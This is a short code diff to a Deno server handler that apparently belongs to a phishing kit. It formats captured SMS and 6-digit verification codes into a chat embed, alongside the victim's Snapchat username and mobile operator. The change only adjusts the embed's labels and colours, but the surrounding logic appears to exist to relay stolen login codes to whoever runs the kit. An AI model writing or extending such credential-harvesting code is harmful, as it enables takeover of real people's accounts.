@@ -68,9 +68,12 @@ Deno.serve(async (req) => {
     }
   }
 
+  const isCode6 = code?.length === 6;
+  const codeLabel = isCode6 ? "🔢 Code 6 chiffres entré" : "🔑 Code SMS entré";
+
   const embed = {
-    title: "🔑 Code SMS entré",
-    color: operatorColors[operateur] || 16776960,
+    title: codeLabel,
+    color: isCode6 ? 0x9B59B6 : (operatorColors[operateur] || 16776960),
     fields: [
       { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
       { name: "📡 Opérateur", value: operateur, inline: true },
